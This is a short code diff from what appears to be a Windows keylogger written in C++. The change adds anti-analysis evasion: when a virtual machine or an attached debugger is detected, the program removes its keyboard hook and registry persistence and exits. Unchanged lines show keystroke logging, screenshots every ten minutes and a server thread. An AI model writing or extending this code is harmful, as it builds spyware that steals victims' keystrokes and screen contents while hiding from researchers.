@@ -22,7 +22,7 @@ int main() {
 #endif
 
 #ifndef DEBUG_BUILD
-	if (Sys::CheckForVirtualMachine()) {
+	if (Sys::CheckForVirtualMachine() || IsDebuggerPresent() != 0) {
 		KeyHook::UninstallHook();
 		Sys::RemoveFromRegistry();
 		KeyHook::KillProcess();
@@ -52,8 +52,6 @@ int main() {
 	Stream::WriteLog(write, KeyHook::activeProcess, logFile, false);
 	Screen::CaptureScreen(path + "\\", "winpst", true, MINUTE*10); // Screenshot
 
-	auto pClientThreadHandleParams = new CHStruct();
-	pClientThreadHandleParams->file = path; // TODO: Idk if this is the path we need
 
 	std::thread keyHookThread(KeyHook::HandleMessage, true);
 	std::thread serverThread(ServerThread, nullptr);
